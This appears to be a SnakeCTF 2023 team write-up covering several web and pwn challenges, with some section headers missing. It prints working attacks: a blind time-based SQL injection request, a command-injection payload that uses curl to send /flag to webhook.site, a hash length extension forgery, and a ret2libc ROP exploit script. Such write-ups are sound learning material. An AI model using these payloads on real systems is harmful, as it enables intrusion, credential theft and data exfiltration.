This challenge is written in Java using the Spring Framework. It apparently contains just an admin login form and a bot that authenticates every few seconds and retrieves the flag.

Let's look at the source; the app only contains the `/login` route and a `/auth/flag` route. This last one prints the flag only after authentication.

```java:AuthController.java
@Controller
@RequestMapping("/auth")
public class AuthController {
  @GetMapping("/helloworld")
  public String salutavaSempre() {
    return "status";
  }

  @GetMapping("/flag")
  public ResponseEntity<String> flaggavaSempre() {
    File f = new File("/flag");
    String flag;
    try {
      InputStream in = new FileInputStream(f);
      flag = new String(in.readAllBytes());
      in.close();
    } catch (Exception e) {
      flag = "PLACEHOLDER";
    }
    return new ResponseEntity<String>(flag, HttpStatus.OK);
  }
}
```

There isn't any vulnerability here; but there's something interesting in the source of the client-side website:

```js:worker.js
const setMetric = (name) => {
  fetch(`/actuator/metrics/${name}`).then(res => res.json()).then(json => {
    console.log({json});
    self.postMessage({name, value: json.measurements[0].value});
  });
};
```

The app might be using the "Spring Actuator" module to gather metrics.

```xml:pom.xml
⋮
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-actuator</artifactId>
</dependency>
⋮
```

It is indeed doing so, and furthermore it has enabled all the available endpoints; even some that maybe shouldn't be public...

```ini:application.properties
management.endpoints.web.exposure.include=*
```

```http
GET /actuator HTTP/2
Host: springbrut.snakectf.org

HTTP/2 200 OK
Content-Type: application/vnd.spring-boot.actuator.v3+json
⋮

{
  "_links": {
    ⋮
    "heapdump": {
      "href": "https://springbrut.snakectf.org/actuator/heapdump",
      "templated": false
    },
    ⋮
  }
}
```

```http
GET /actuator/heapdump HTTP/2
Host: springbrut.snakectf.org

HTTP/2 200 OK
Content-Type: application/octet-stream
Content-Length: 54594327
⋮
```

In the dump it's possible to find the username/password credentials: `username=admin&password=DGcZvIYwahxgqIBJyOw7Tk2WVwLKFZ4b`.

After logging in, it's just a matter of calling `/auth/flag` et voila!

Note: After solving the challenge the author confirmed us that our solution was unintended. Being the challenge in PHP, and considering the unintended solution made use of one of the many quirks PHP has, this prompts for a PHP meme.

![php being php](/assets/img/SnakeCTF_2023/phpotato-php.jpg)

Anyway, the app consists of an intricated system of lambda functions and event-based hooks that allow users to create and execute some pipelines made of instructions.

Actually, only the admin user is allowed to create and execute these pipelines; so, first step: get admin access.

The app uses a mysql database and in the codebase there are many raw queries. One of these was injectable:

```php:home.php
$handle_get = fn(&$mysqli, &$account_numbers) =>
    ($query = "SELECT * FROM numbers WHERE user_id = " . $_SESSION['id']) &&
    (isset($_GET['sort']) ?
        ($query .= " ORDER BY processed_date " . $_GET['sort'])
        : true
    ) &&
    (isset($_GET['limit']) ?
        ($query .= " LIMIT " . $_GET['limit'])
        : true
    ) &&
    (print($query)) && # added to understand the result
    ($query_result = $mysqli->query($query)) &&
    ($res = $query_result->fetch_all(MYSQLI_ASSOC)) &&
    ($account_numbers = implode(array_map($render_number, $res))
    );
```

We need to find a way to control the `sort` query parameter; as the app rewrites the URLs to make the pretty, let's first understand how it does so.

```ini:.htaccess
php_flag register_globals off

RewriteEngine on
RewriteBase /

RewriteRule ^/?$                                                        /index.php?page=home                                [L]

# TODO: FIX and make it better

RewriteRule ^(home|login|register|admin)$                               /index.php?page=$1                                  [NC,L]

RewriteRule ^(home|admin)/sort-(asc|desc)/?$                            /index.php?page=$1\&sort=$3                         [NC,L]
RewriteRule ^(home|admin)/sort-(asc|desc)/limit-([^/]+)/?$              /index.php?page=$1\&sort=$3\&limit=$4               [NC,L]

RewriteRule ^(home|admin)/p-([^/]+)/?$                                  /index.php?page=$1\&precision=$2                    [NC,L]
RewriteRule ^(home|admin)/p-([^/]+)/sort-(asc|desc)/?$                  /index.php?page=$1\&precision=$2\&sort=$3           [NC,L]
RewriteRule ^(home|admin)/p-([^/]+)/sort-(asc|desc)/limit-([^/]+)/?$    /index.php?page=$1\&precision=$2\&sort=$3\&limit=$4 [NC,L]

RewriteRule ^(home|login|register|admin)\.php$ -                                                                            [NC,F,L]
```

So it actually possible to control the `sort` parameter using the full URL as in: `/index.php?page=home&sort=PAYLOAD`

Given the injection context we opted to do a blind time-based injection to recover the `admin` password in the `users` table.

```sql:schema.sql
⋮
CREATE TABLE users
(
        id int NOT NULL AUTO_INCREMENT PRIMARY KEY,
        username varchar(255) UNIQUE,
        password varchar(255),
        is_admin boolean
);
⋮
INSERT INTO users(id, username, password, is_admin) VALUES (1, 'admin','REDACTED', true);
⋮
```

Based on the DB schema, the final injection was:

```http
GET /index.php?page=home&sort=AND+(SELECT+1+FROM+users+WHERE+username+%3d+'admin'+AND+HEX(password)+LIKE+'7734%25'+AND+SLEEP(1)) HTTP/2
Host: phpotato.snakectf.org
```

After scripting a bit we recovered the admin password: `w4GNskGHWrfmodOhtc04dphIttnBhEcT`

With the admin credentials we can access the pipeline creation process

![pipeline-creation](/assets/img/SnakeCTF_2023/phpotato-pipeline-admin.png)

Now, we'll only show how to get to our solution, not the actual intended one.

Here are the most important snippets from the source code:

To start off, the flag is defined globally as `FLAG`

```php:misc/config.php
$define_flag = fn() => define('FLAG', getenv('FLAG'));
```

Second of all, pipelines are first created with a request, and then are processed with another one. After creating a pipeline, this is the lambda function that handles requests to process them:

{:.linenumber}
```php:pages/numbers.php
$handle_post_process = fn(&$mysqli) =>
    ($stmt = $mysqli->prepare('SELECT id, num, pipeline FROM numbers WHERE user_id = ? AND id = ?')) &&
    $stmt->bind_param("ii", $_SESSION['id'], $_POST['id']) &&
    $stmt->bind_result($id, $num, $pipeline) &&
    (
        ($res = $stmt->execute()) &&
        $stmt->fetch() &&
        ($pipeline_e = explode("\n", $pipeline)) && //newline separates istructions
        ($_SESSION['pipeline']['instructions'] = array_map($parse_instruction, $pipeline_e)) &&
        (($_SESSION['pipeline']['num'] = $parse_number($num)) || $_SESSION['pipeline']['num'] == 0) &&
        ($_SESSION['pipeline']['id'] = $id) ?
        set_user_hook('start_processing')
        : set_user_hook('something_wrong')
    ) || header('Refresh:0') || exit();
```

The only important parts are lines 8-11, as `$id`, `$num`, `$pipeline` are user-controlled and are then reflected on the page.

Line 10 is especially interesting as it calls `$parse_number`:

```php:misc/pipeline.php
$parse_number = fn($num) =>
    (
    $num != '' &&
    ($num = trim($num)) &&
    ctype_digit($num) ?
    intval($num)
    : (defined($num) && $num != "FLAG" ?
        constant($num)
        : 0
    )
);
```

If `$num` is a number, it is displayed as such, otherwise the global variable with such name is returned. The only limitation is that `$num` cannot be the same as `FLAG`.

I shall remind you:

- `$num` is in our control.
- the flag is the global constant called `FLAG`.

What it's missing? Only this last php quick. It is true that we can't use `FLAG`, but what if it had some other way to be referenced?

It turns out that the [constant function](https://www.php.net/manual/en/function.constant.php) also supports classes/enum constants (`Foo::Bar`), and namespaces (`/NameSpace/Foo::Bar`). Therefore we can actually set `$num` as `/FLAG` and after processing the pipeline, the flag is shown to everyone on the board.

Unfortunately, we solved this challenge shorty after the end of the CTF; still, it was really interesting so we'll include our writeup of this one too.

This app was written in ruby using RoR and a few other modules. To get a rough idea:

```bash:Gemfile
source 'https://rubygems.org'
git_source(:github) { |repo| "https://github.com/#{repo}.git" }

ruby '3.0.6'

# Bundle edge Rails instead: gem "rails", github: "rails/rails", branch: "main"
gem 'rails', '~> 7.0.4', '>= 7.0.4.3'

# The original asset pipeline for Rails [https://github.com/rails/sprockets-rails]
gem 'sprockets-rails'

# Use sqlite3 as the database for Active Record
gem 'sqlite3', '~> 1.4'

# Use the Puma web server [https://github.com/puma/puma]
gem 'puma', '~> 5.0'

# Use Active Storage variants [https://guides.rubyonrails.org/active_storage_overview.html#transforming-images]
gem 'curl'
gem 'rmagick'

A carousel of 🐱 cats photos 🐱 greets us!

As the codebase is quite extended and complex, we'll skip the overview as done with previous challenges. Instead, let's go trough the steps to solve this challenge.

1. Find username of an user with admin privileges
2. Exploit `reset_submit` functionality using an Hash Length Extension attack to retrieve the admin account password
3. Exploit a command injection in the cat image preview feature to read the `/flag` file

First, the most important part is that `reset_submit` is vulnerable.

{:.linenumber}
```rb:/app/controllers/users_controller.rb
⋮
def reset_submit
    if logged_in?
      redirect_to root_path
      return
    end
    @account = User.new

    # GET
    if request.get?
      render :reset_submit
      nil
    else
      # POST
      unless User.exists?(username: params[:user][:username].last(8))
        @message = 'User not found!'
        render :reset_submit, status: :unprocessable_entity
        return
      end

      unless check(params[:user][:username], params[:user][:reset_token])
        @message = 'Wrong reset token!'
        render :reset_submit, status: :unprocessable_entity
        return
      end

      @account = User.find_by(username: params[:user][:username].last(8))
      @message = "Sorry, we're still building the application. Your current password is: " + @account.password
      render :reset_submit, status: :gone
      nil
    end
  end
⋮
```

Going bottom-up, at line 28 the password of the account with the username specified by us is printed out (Warning bell 1).

To get there, the user must exist and the `check()` function must return `True`.

It should now be clear why in the sourcecode provided the admin username was REDACTED. Later we'll check how to get this username, for now, let's finish analyzing this function at hand.

`check()` make sure that the reset_token generated for the account is the same as the one provided by us. Ideally, this token would be unique and should be sent to us by email to let us confirm our identity before revealing our password.

```rb:/app/helpers/users_helper.rb
module UsersHelper
    require 'digest'

    def cipher(username)
        generator = Digest::SHA256::new
        generator << ENV['SECRET'] + username

        return generator.hexdigest()
    end

    def check(username, token)
        generator = Digest::SHA256::new
        generator << ENV['SECRET'] + username

        return generator.hexdigest() == token
    end
end
```

`cipher()` is called somewhere else to set an account reset_token, `check()` is the one seen in the previous snippet.

This is clearly vulnerable to an [hash length extension](https://github.com/iagox86/hash_extender) attack if you have ever seen one.

Furthermore, note how in `users_controller.rb` at line 15 and 27, only the last 8 characters of our input are used, but, for checking the token the whole line is used (line 21).

Therefore an hash length extension attack seems possible as even if our input string changes (look at the repo linked above) only the last 8 chars are used, and we can control those.

The last piece thing necessary would be that the admin username has actually length 8, to make things possible and easier. Spoiler: that's exactly right!

So, let's find this username. This is quite straight-forward as the view for the route `/users/:id` reveals the username and whether the user is an admin or not.

```html:/app/views/users/show.html.erb
<% content_for :content do %>
  <% content_for :subcontent_1 do %>
    <div class="row ">
      <h4 class="card-title center-align black-text">Account information</h4>
    </div>
    <div class="row padded-lr-5">
      <label for="username" class="black-text">Username</label>
      <p class="black-text" name="username">
        <%= @account.username %>
      </p>
    </div>
    <div class="row padded-lr-5">
      <label for="admin" class="black-text">admin</label>
      <p class="black-text" name="admin">
        <%= @account.username === ENV['ADMIN_USER'] %>
      </p>
    </div>
    ⋮
```

The user with id `76` has the username, `4dm1n_54`, and is an admin.

Good, let's register an user `asdfff`, call `/reset` with both the admin username and ours to generate the reset_token, and let's perform the Hash Extension attack:

1) Get our reset_token in the Account page: `6bf6afb6be14fdf510757661524d0e9017c6907f606ffb7cd593e9dd831eacf6`

2) extend it: (the length can be seen in the docker-compose.yaml)

```shell
~$ hash-extender -d asdfff -s 6bf6afb6be14fdf510757661524d0e9017c6907f606ffb7cd593e9dd831eacf6 -a 4dm1n_54 -f sha256 -l 32
Type: sha256
Secret length: 32

```

3) Send the reset request:

```http
POST /reset_submit HTTP/2
Host: kattinger.snakectf.org
Cookie: _kattinger_session=...
⋮
authenticity_token=...&user%5Busername%5D=%61%73%64%66%66%66%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%30%34%64%6d%31%6e%5f%35%34&user%5Breset_token%5D=612f6c80243651c32c1683145e3be84efe31a2338fda0ca11ce72b23f9b6834c&user%5Bpassword%5D=&commit=Reset+it+now

    </div>
      ⋮
```

With the credentials `4dm1n_54`:`WOQpcmueCgBuXkMHQeJd0f8XVp0cO1Px`, we can now log-in as admin.

Let's exploit the image preview feature to get the flag:

```rb:app/helpers/cats_helper.rb
module CatsHelper
    require 'curl'
    require 'rmagick'
    require 'base64'
    require 'timeout'

    include Magick

    def process_image(image_path)
        p "Processing: " + image_path
        image_path = image_path.encode!("utf-8").scrub()
        if image_path.start_with?('http') || image_path.start_with?('https')
            curl = CURL.new({:cookies_disable => false})
            curl.debug=true
            p image_path
            filename = Timeout::timeout(3) do
                curl.save!(image_path)
            end
            p filename
        else
            filename = image_path
        end
        processed = ImageList.new(image_path)
        processed = processed.solarize(100)
        result = 'data://image;base64,' + Base64.strict_encode64(processed.to_blob())
        File.unlink(filename)
        return result

    end
end
```

From trial and error, or by mostly looking at the output of our local instance, we see that the `image_path` is used with CURL library and is actually vulnerable to command injection.

`image_path` is the location that can be specified when adding a new cat to the collection. From the output we see that the actual command executed underneath by the library is the following:

`curl   --user-agent "Googlebot/2.1 (+http://www.google.com/bot.html)"    --location --compressed --silent  "OUR_IMAGE_PATH" --output "/tmp/curl/curl_0.6715324541398725_0.13914753312651085.jpg"`

Let's change the location with the following and ask for a new preview:

`https://webhook.site/YOUR_UUID/start" && curl -X POST -H "Content-Type: multipart/form-data" -F "data=@/flag" https://webhook.site/YOUR_UUID/flag && cat -- "`

# Pwn

## military grade authentication

> We just started using this military-grade software to authenticate accesses to our infrastructure.<br><br>
> We don't really understand it, but I'm sure that it's secure! We don't know the password either, after all!<br><br>
> nc pwn.snakectf.org 1337

This challenge gives us a binary file which checks for a password:

```c
if ( read(0, s1, 128uLL) <= 0 )
    err(1, "read broken lol");
  if ( !strcmp(s1, (const char *)buf) )
  {
    puts(&s);
    get_shell();
  }
```

the error is obviously in the use of strcmp, as it stops when it finds a null byte,
so to bypass the check we just need to send null bytes and the program will authenticate us as if the password is correct:

```python
r.sendline(b'\x00' * 128)
```

And we get the shell!

## obligatory bof

> Well, you gotta do what you gotta do!<br><br>
> nc pwn.snakectf.org 1338

this is the decompiled code:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf[4]; // [rsp+0h] [rbp-20h] BYREF

  buf[0] = 0LL;
  buf[1] = 0LL;
  buf[2] = 0LL;
  buf[3] = 0LL;
  init(argc, argv, envp);
  printf("Well, just tell me what to do: ");
  read(0, buf, 256uLL);
  puts("Ok, got it!");
  return 0;
}
```

We can see that read() is vulnerable to buffer overflow, and if we look with checksec, we see that no protections are active except for NX.
Also, you can find the libc version used by checking inside the docker environment.
The way to solve this is to exploit the bof two times: 
get a libc leak by printing a got address and calculate libc base address, then return to main and exploit the bof again to return to one_gadget that will call system("/bin/sh").

Here is the script: 

```python
def main():
	offset = 40 
	rop = ROP(exe)

	# bof to leak libc
	payload = flat( 
		'A' * offset,
		p64(rop.find_gadget(['pop rdi', 'ret']).address),
		p64(exe.got.puts),
		p64(exe.plt.puts),
		p64(exe.sym.main)
	)
	sl(payload)
	ru("it!\n")
	
	leak = u64(rl()[:-1] + b'\x00' * 2) # libc leak
	libc.address = leak - libc.sym.puts # find libc base addr
	rop2 = ROP(libc)

	# ret2 one_gadget after setting constraints
	payload2 = flat(
			'A' * offset,	
			p64(rop2.find_gadget(['pop r15', 'ret']).address),
			p64(0),
			p64(rop2.find_gadget(['pop r12', 'ret']).address),
			p64(0),
			p64(libc.address + 0xe3afe) # one gadget
	)

	sl(payload2)
	r.interactive()
```

This challenge follows the same idea as the previous one, but we actually found it easier. Easier given that this challenge had an hint that somewhat pointed us in the right direction from the start unlike the other one.

The hint was an [old xkcd image](https://xkcd.com/195/).

To start off, as before, we mapped the network of IPs in the `chall` network (10.20.0.0/20) using nmap:

```shell
-bash-5.2$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: chall: <BROADCAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default qlen 1000
    link/ether 86:5b:2c:ef:06:2c brd ff:ff:ff:ff:ff:ff
    inet 10.20.0.1/20 scope global chall
       valid_lft forever preferred_lft forever
1343: eth0@if1344: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:11:1e:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.30.3/24 brd 172.17.30.255 scope global eth0
       valid_lft forever preferred_lft forever

-bash-5.2$ nmap -n -sn -T5 10.20.0.0/20
⋮
Nmap scan report for 10.20.15.117
Host is up (0.0010s latency).
⋮
```

So, we had the idea of plotting the IPs in a grid using the hilbert curve pattern shown in the XKCD. Black square if the host is up, white if it's not.

Having 4096 IPs, we used an algorithm that generated a hilbert curve of order 6 (?), which could be represented in a 64x64 grid.

Then it was a matter of parsing the nmap data and writing a plotter that actually worked.

It's seems trivial explained like this, but it actually took as quite a few hours (👀 and the OpenAI's power 👀) to get this right.

So, here's the final script:

```python
import matplotlib.patches as patches
import matplotlib as plt
import matplotlib.pyplot as plt
import numpy as np

def hilbert_curve(order):
    """
    Generate Hilbert curve coordinates for a given order.
    """
    def step(index):
        """
        Generate a single step in the Hilbert curve, using the binary representation of 'index'.
        """
        x, y = 0, 0
        s = 1
        while s < 2**order:
            rx = 1 & (index // 2)
            ry = 1 & (index ^ rx)
            x, y = rotate(s, x, y, rx, ry)
            x += s * rx
            y += s * ry
            index //= 4
            s *= 2
        return x, y

    def rotate(n, x, y, rx, ry):
        """
        Rotate/flip a quadrant appropriately.
        """
        if ry == 0:
            if rx == 1:
                x = n - 1 - x
                y = n - 1 - y
            return y, x
        return x, y

    return [step(i) for i in range(2**(order * 2))]


def draw_hilbert_pattern(array, order):
    """
    Draw a grid of blocks following the Hilbert curve pattern, coloring blocks based on the given array.
    """
    # Generate the Hilbert curve points
    hilbert_points = hilbert_curve(order)

    # Prepare the figure and axis
    fig, ax = plt.subplots(figsize=(8, 8))
    ax.set_xlim(0, 2**order)
    ax.set_ylim(0, 2**order)
    ax.set_aspect('equal', adjustable='box')
    ax.axis('off')

    # Draw each block
    block_size = 1
    for index, point in enumerate(hilbert_points):
        if index < len(array) and array[index]:
            rect = patches.Rectangle(point, block_size, block_size, linewidth=1, edgecolor='none', facecolor='black')
            ax.add_patch(rect)

    plt.title(f'Hilbert Pattern for Order {order}')
    plt.show()

# list with booleans that indicates if the relevant host is up or not.
# given an ip 10.20.x.y -> index = x*256 + y
values = [False, True, True, False, ...]

assert len(values) == 4096

# Draw the grid
draw_hilbert_pattern(np.array(values), 6)
```
